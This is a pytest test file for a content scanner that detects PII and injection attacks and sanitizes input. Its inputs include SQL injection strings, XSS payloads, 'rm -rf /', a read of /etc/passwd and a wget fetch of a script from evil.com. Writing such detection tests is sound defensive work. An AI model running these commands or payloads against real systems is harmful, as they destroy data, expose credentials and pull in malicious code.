"""Tests for ContentScanner class."""

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from backend.backend.pdp.content_scanner import ContentScanner, PROHIBITED_PATTERNS
from backend.backend.pdp.schemas import Severity, PatternType
from backend.backend.models import Base


@pytest.fixture
def db_session():
    """Create an in-memory SQLite database for testing."""
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    session = Session()
    yield session
    session.close()


@pytest.fixture
def scanner(db_session):
    """Create a ContentScanner instance."""
    return ContentScanner(db_session)


def test_scan_safe_content(scanner):
    """Test that safe content passes scanning."""
    content = "This is a normal, safe document with regular text."
    
    result = scanner.scan(content)
    
    assert result.safe is True
    assert len(result.violations) == 0
    assert result.severity == Severity.LOW


def test_scan_empty_content(scanner):
    """Test scanning empty content."""
    result = scanner.scan("")
    
    assert result.safe is True
    assert len(result.violations) == 0


def test_detect_ssn(scanner):
    """Test detection of Social Security Numbers."""
    content = "My SSN is 123-45-6789 for verification."
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("PII" in v or "ssn" in v.lower() for v in result.violations)
    assert result.severity in [Severity.MEDIUM, Severity.HIGH]


def test_detect_credit_card(scanner):
    """Test detection of credit card numbers."""
    content = "My credit card is 4532-1234-5678-9010"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("PII" in v or "credit" in v.lower() for v in result.violations)


def test_detect_multiple_pii(scanner):
    """Test detection of multiple PII patterns."""
    content = "SSN: 123-45-6789, Card: 4532 1234 5678 9010"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    # Should detect both SSN and credit card
    assert len([v for v in result.violations if "PII" in v]) >= 1


def test_detect_sql_injection(scanner):
    """Test detection of SQL injection patterns."""
    content = "SELECT * FROM users UNION SELECT password FROM admin"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("SQL" in v or "injection" in v.lower() for v in result.violations)
    assert result.severity in [Severity.HIGH, Severity.CRITICAL]


def test_detect_sql_drop_table(scanner):
    """Test detection of SQL DROP TABLE."""
    content = "'; DROP TABLE users; --"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("SQL" in v for v in result.violations)


def test_detect_sql_comments(scanner):
    """Test detection of SQL comment patterns."""
    content = "admin'--"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("SQL" in v for v in result.violations)


def test_detect_xss(scanner):
    """Test detection of XSS patterns."""
    content = "<script>alert('XSS')</script>"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("XSS" in v for v in result.violations)
    assert result.severity in [Severity.HIGH, Severity.CRITICAL]


def test_detect_xss_event_handler(scanner):
    """Test detection of XSS event handlers."""
    content = "<img src=x onerror=alert('XSS')>"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("XSS" in v for v in result.violations)


def test_detect_xss_javascript_protocol(scanner):
    """Test detection of javascript: protocol."""
    content = "<a href='javascript:alert(1)'>Click</a>"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("XSS" in v for v in result.violations)


def test_detect_xss_iframe(scanner):
    """Test detection of iframe tags."""
    content = "<iframe src='http://evil.com'></iframe>"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("XSS" in v for v in result.violations)


def test_detect_command_injection(scanner):
    """Test detection of command injection patterns."""
    content = "ls -la; rm -rf /"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("Command" in v or "injection" in v.lower() for v in result.violations)
    assert result.severity == Severity.CRITICAL


def test_detect_command_injection_pipe(scanner):
    """Test detection of piped commands."""
    content = "input | rm -rf /tmp"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("Command" in v for v in result.violations)


def test_detect_command_injection_backticks(scanner):
    """Test detection of backtick command execution."""
    content = "`cat /etc/passwd`"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert any("Command" in v for v in result.violations)


def test_detect_multiple_violations(scanner):
    """Test detection of multiple different violations."""
    content = """
    SSN: 123-45-6789
    <script>alert('XSS')</script>
    SELECT * FROM users; DROP TABLE admin;
    ; rm -rf /
    """
    
    result = scanner.scan(content)
    
    assert result.safe is False
    # Should detect PII, XSS, SQL injection, and command injection
    assert len(result.violations) >= 4
    assert result.severity == Severity.CRITICAL


def test_check_pii(scanner):
    """Test PII checking method."""
    content = "Email: test@example.com, Phone: 555-123-4567"
    
    violations = scanner.check_pii(content)
    
    assert len(violations) > 0
    assert any("email" in v or "phone" in v for v in violations)


def test_check_injection_sql(scanner):
    """Test SQL injection checking method."""
    content = "UNION SELECT * FROM passwords"
    
    violations = scanner.check_injection(content, "sql_injection")
    
    assert len(violations) > 0


def test_check_injection_xss(scanner):
    """Test XSS injection checking method."""
    content = "<script>alert(1)</script>"
    
    violations = scanner.check_injection(content, "xss")
    
    assert len(violations) > 0


def test_check_injection_command(scanner):
    """Test command injection checking method."""
    content = "; wget http://evil.com/malware.sh"
    
    violations = scanner.check_injection(content, "command_injection")
    
    assert len(violations) > 0


def test_check_malicious_special_chars(scanner):
    """Test detection of excessive special characters."""
    content = "!@#$%^&*()_+{}[]|\\:;<>?,./`~!@#$%^&*()_+{}[]|\\:;<>?,./`~"
    
    violations = scanner.check_malicious(content)
    
    assert "excessive_special_chars" in violations


def test_check_malicious_null_bytes(scanner):
    """Test detection of null bytes."""
    content = "test\x00content"
    
    violations = scanner.check_malicious(content)
    
    assert "null_bytes" in violations


def test_check_malicious_url_encoding(scanner):
    """Test detection of excessive URL encoding."""
    content = "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" * 2
    
    violations = scanner.check_malicious(content)
    
    assert "excessive_url_encoding" in violations


def test_check_malicious_base64(scanner):
    """Test detection of base64 payloads."""
    content = "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB0aGF0IHNob3VsZCB0cmlnZ2VyIGRldGVjdGlvbg=="
    
    violations = scanner.check_malicious(content)
    
    assert "base64_payload" in violations


def test_sanitize_removes_scripts(scanner):
    """Test that sanitization removes script tags."""
    content = "Normal text <script>alert('XSS')</script> more text"
    
    sanitized = scanner._sanitize(content)
    
    assert "<script>" not in sanitized
    assert "Normal text" in sanitized
    assert "more text" in sanitized


def test_sanitize_removes_event_handlers(scanner):
    """Test that sanitization removes event handlers."""
    content = "<div onclick='alert(1)'>Click me</div>"
    
    sanitized = scanner._sanitize(content)
    
    assert "onclick" not in sanitized.lower()


def test_sanitize_removes_javascript_protocol(scanner):
    """Test that sanitization removes javascript: protocol."""
    content = "<a href='javascript:alert(1)'>Link</a>"
    
    sanitized = scanner._sanitize(content)
    
    assert "javascript:" not in sanitized.lower()


def test_sanitize_removes_sql_comments(scanner):
    """Test that sanitization removes SQL comments."""
    content = "admin'-- comment"
    
    sanitized = scanner._sanitize(content)
    
    assert "--" not in sanitized


def test_sanitize_removes_iframes(scanner):
    """Test that sanitization removes iframe tags."""
    content = "Text <iframe src='evil.com'></iframe> more"
    
    sanitized = scanner._sanitize(content)
    
    assert "<iframe" not in sanitized.lower()


def test_sanitize_removes_null_bytes(scanner):
    """Test that sanitization removes null bytes."""
    content = "test\x00content"
    
    sanitized = scanner._sanitize(content)
    
    assert "\x00" not in sanitized


def test_scan_result_includes_sanitized_text(scanner):
    """Test that scan result includes sanitized text for violations."""
    content = "<script>alert('XSS')</script>"
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert result.sanitized_text is not None
    assert "<script>" not in result.sanitized_text


def test_scan_result_no_sanitized_for_safe(scanner):
    """Test that safe content doesn't get sanitized."""
    content = "This is safe content."
    
    result = scanner.scan(content)
    
    assert result.safe is True
    assert result.sanitized_text is None


def test_scan_result_details(scanner):
    """Test that scan result includes detailed violation info."""
    content = """
    <script>alert('XSS')</script>
    SELECT * FROM users;
    """
    
    result = scanner.scan(content)
    
    assert result.safe is False
    assert isinstance(result.details, dict)
    assert len(result.details) > 0


def test_severity_levels(scanner):
    """Test that different violations have appropriate severity."""
    # PII should be MEDIUM
    pii_result = scanner.scan("SSN: 123-45-6789")
    assert pii_result.severity == Severity.MEDIUM
    
    # SQL/XSS should be HIGH
    sql_result = scanner.scan("SELECT * FROM users")
    assert sql_result.severity == Severity.HIGH
    
    # Command injection should be CRITICAL
    cmd_result = scanner.scan("; rm -rf /")
    assert cmd_result.severity == Severity.CRITICAL


def test_patterns_loaded_from_constants(scanner):
    """Test that patterns are loaded from constants."""
    assert scanner.patterns is not None
    assert "pii" in scanner.patterns
    assert "sql_injection" in scanner.patterns
    assert "xss" in scanner.patterns
    assert "command_injection" in scanner.patterns


def test_case_insensitive_detection(scanner):
    """Test that pattern detection is case-insensitive."""
    # Uppercase SQL
    content1 = "SELECT * FROM users"
    result1 = scanner.scan(content1)
    assert result1.safe is False
    
    # Lowercase SQL
    content2 = "select * from users"
    result2 = scanner.scan(content2)
    assert result2.safe is False
    
    # Mixed case SQL
    content3 = "SeLeCt * FrOm users"
    result3 = scanner.scan(content3)
    assert result3.safe is False
